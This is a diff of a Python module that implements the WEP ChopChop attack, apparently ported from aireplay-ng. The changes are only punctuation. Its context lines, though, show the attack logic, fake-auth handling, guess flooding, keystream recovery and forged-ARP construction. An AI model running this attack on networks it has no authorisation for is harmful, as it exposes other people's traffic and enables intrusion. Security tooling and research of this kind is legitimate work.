@@ -1,15 +1,15 @@
-"""WEP ChopChop attack (`aireplay-ng -4`) — M6.
+"""WEP ChopChop attack (`aireplay-ng -4`): M6.
 
 Decrypts a captured frame byte-by-byte using the AP's ICV check, no key:
 chop the last byte, guess its plaintext (≤256), fix the ICV
-(dot11.wep.crypto.chop_last_byte_and_fixup — CRC32 is linear), re-header to a data
+(dot11.wep.crypto.chop_last_byte_and_fixup, CRC32 is linear), re-header to a data
 frame from us, send. The AP relays the shortened frame IFF the guess was right.
 Walk backwards recovering one keystream byte per accepted guess → enough
 keystream to forge a broadcast ARP → hand to replay.
 
 IDENTITY-BY-CONSTRUCTION (ported from aireplay-ng's do_attack_chopchop, the
 ground truth): we do NOT infer which guess the AP accepted from "which frame we
-sent" or "which relay came first" — that inference is what made sibling-BSS
+sent" or "which relay came first". That inference is what made sibling-BSS
 echoes and multi-relay APs ambiguous. Instead, like aireplay, we **stamp the
 guess value into the destination MAC** of every candidate (DA =
 ``FF:rr:rr:rr:rr:GUESS``, with a sentinel bit in byte 1), blast all 256 guesses
@@ -19,23 +19,23 @@ identity, so guess order is irrelevant, duplicate echoes resolve to the same
 byte, and a multi-relay AP can't confuse us. No DFS, no "first is truth."
 
 The sentinel (guess 256) is a deliberately bad-ICV frame: if the AP relays it,
-the AP doesn't discard invalid-ICV frames and chopchop can't work — we say so
+the AP doesn't discard invalid-ICV frames and chopchop can't work: we say so
 rather than failing silently (aireplay-ng.c, the ``h80211[5] & 1`` check).
 
 Keystream recovery (the offline-testable core): the keystream is fixed per IV,
 so each accepted guess gives ks[i] = body[i] XOR guess, recovered end-inward. We
 chop to the AP's drop-short wall, then reconstruct the hidden head from known
-structure — confirmed offline against the captured frame's OWN ICV, no AP round-
+structure, confirmed offline against the captured frame's OWN ICV, no AP round-
 trip (aireplay-ng's header_rec):
   - ARP: LLC/SNAP + ARP-request header is known through byte 15. A wall one byte
     into the (unknown) sender MAC has that single byte recovered from the AP.
   - IP (any broadcast IP datagram): LLC/SNAP + IP version/IHL + TOS + total-
-    length cover bytes 0..11 — version/IHL and TOS are brute-forced (16×256),
+    length cover bytes 0..11: version/IHL and TOS are brute-forced (16×256),
     total-length is computed from the frame size, all confirmed by the CRC. This
     needs the AP to relay down to a <=12-byte cipher; a deeper wall hides
     genuinely-unknown IP fields (id / flags / TTL / …) we can't derive.
 Either way the output is a forged broadcast ARP (we only need ~40 keystream
-bytes for the IV) handed to replay — the seed type only changes how the head is
+bytes for the IV) handed to replay, the seed type only changes how the head is
 recovered.
 
 Lifecycle mirrors WepFragmentation (start/stop/state, on_forged_arp, keep-
@@ -68,7 +68,7 @@ _BROADCAST = b"\xff" * 6
 # 0x0806 (2) + ARP htype/ptype/hlen/plen/op-request (8) = 16 bytes. ks[0..15] =
 # cipher[0..15] XOR this, so we don't chop them (and don't shrink the frame to a
 # too-short-to-relay size). Assumes the captured broadcast frame is an ARP
-# request — true for broadcast ARP. (IP-packet seeds via header reconstruction
+# request: true for broadcast ARP. (IP-packet seeds via header reconstruction
 # are a planned follow-up.)
 _KNOWN_ARP16 = bytes([
     0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06,
@@ -78,7 +78,7 @@ _KNOWN_ARP16 = bytes([
 # 2 bytes are the ethertype (0x0806 ARP / 0x0800 IP) that says what follows.
 _KNOWN_SNAP = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00])
 _ETHERTYPE_IP = bytes([0x08, 0x00])
-# Stop chopping once only SNAP+ethertype (bytes 0..7) would remain — that's
+# Stop chopping once only SNAP+ethertype (bytes 0..7) would remain, that's
 # always-known structure, nothing to gain by chopping into it.
 _CHOP_FLOOR = 8
 # IP header reconstruction (aireplay's header_rec) covers bytes 0..11 only:
@@ -145,7 +145,7 @@ class WepChopChop:
         self.store = store
         self.source_mac = source_mac
         self._on_forged_arp = on_forged_arp
-        # Awaited before a guess sweep — authenticates lazily (True iff
+        # Awaited before a guess sweep: authenticates lazily (True iff
         # associated). We spam 256 frames per byte, so re-auth on demand.
         self._ensure_associated = ensure_associated or _always_associated
         self._log = log_callback or (lambda _m: None)
@@ -294,7 +294,7 @@ class WepChopChop:
             return
 
     async def _await_assoc(self) -> bool:
-        """Don't burn guesses while de-associated — (lazily) authenticate first;
+        """Don't burn guesses while de-associated: (lazily) authenticate first;
         ensure_associated() retries internally before giving up."""
         return self._active and await self._ensure_associated()
 
@@ -368,7 +368,7 @@ class WepChopChop:
     async def _loop(self) -> None:
         try:
             while self._active:
-                # Find a seed FIRST — only then is it worth authenticating
+                # Find a seed FIRST: only then is it worth authenticating
                 # (lazy fake-auth; no presence with nothing to chop).
                 cipher = self._pick_target()
                 if not cipher:
@@ -376,7 +376,7 @@ class WepChopChop:
                     await asyncio.sleep(0.3)
                     self._maybe_heartbeat()
                     continue
-                # We have a seed — (lazily) associate before chopping.
+                # We have a seed: (lazily) associate before chopping.
                 if not await self._await_assoc():
                     self._set_state("waiting-auth")
                     await asyncio.sleep(0.3)
@@ -388,7 +388,7 @@ class WepChopChop:
                     return
                 if forged is None:
                     # The wall left an un-brute-forceable gap, the AP went quiet,
-                    # or it isn't vulnerable — blacklist this seed, try another.
+                    # or it isn't vulnerable: blacklist this seed, try another.
                     # Keep retrying (never auto-stop), per the design.
                     self._log(treelog.leaf_fail(
                         "[yellow]couldn't recover from this seed[/yellow] "
@@ -405,7 +405,7 @@ class WepChopChop:
                             wall_l: int) -> Optional[bytearray]:
         """Reconstruct the keystream for the hidden head [0..wall_l-1] (the bytes
         below the AP's drop-short wall) from known frame structure, confirmed
-        against the captured frame's OWN ICV — no AP needed for the
+        against the captured frame's OWN ICV, no AP needed for the
         verification (aireplay-ng's header_rec). Returns the full keystream, or
         None.
 
@@ -413,8 +413,8 @@ class WepChopChop:
           - ARP: LLC/SNAP + ARP-request header is known through byte 15. If the
             wall sits one byte into the (unknown) sender MAC, that single byte is
             recovered from the AP (it's real data, not derivable).
-          - IP: LLC/SNAP + IP version/IHL + TOS + total-length cover bytes 0..11
-            — version/IHL and TOS are brute-forced (16×256) and total-length is
+          - IP: LLC/SNAP + IP version/IHL + TOS + total-length cover bytes 0..11:
+            version/IHL and TOS are brute-forced (16×256) and total-length is
             computed from the frame size, all confirmed offline by the CRC. Only
             viable when the wall is shallow (<=12); a deeper wall hides
             genuinely-unknown IP fields."""
@@ -440,7 +440,7 @@ class WepChopChop:
                 return ks
         elif wall_l <= nknown + self._MAX_BRUTE_BYTES:
             # The wall left one genuinely-unknown byte (sender-MAC start) between
-            # the known ARP header and the wall — recover it from the AP.
+            # the known ARP header and the wall: recover it from the AP.
             ks = ks_with(_KNOWN_ARP16)
             ksb = await self._ap_brute_byte(ks, nknown)
             if ksb is not None:
@@ -448,11 +448,11 @@ class WepChopChop:
                 if crc_ok(ks):
                     return ks
 
-        # ---- IP (any broadcast IP datagram) — header reconstruction ----
+        # ---- IP (any broadcast IP datagram): header reconstruction ----
         if wall_l <= _IP_MAX_WALL:
             if wall_l > _CHOP_FLOOR:
                 self._log(treelog.branch(
-                    "[dim]not an ARP — reconstructing the IP header "
+                    "[dim]not an ARP: reconstructing the IP header "
                     "(offline CRC search)…[/dim]"
                 ))
             totlen = n - 12                # IP datagram length (see module notes)
@@ -474,7 +474,7 @@ class WepChopChop:
         tagged candidates, and read back the one that relays. ``ks`` must be
         known for every forged-ARP position except ``p``."""
         self._log(treelog.branch(
-            "[dim]drop-short wall — recovering the boundary byte from the AP "
+            "[dim]drop-short wall: recovering the boundary byte from the AP "
             "(256 forged ARPs)…[/dim]"
         ))
         plain = arp_request_plaintext(
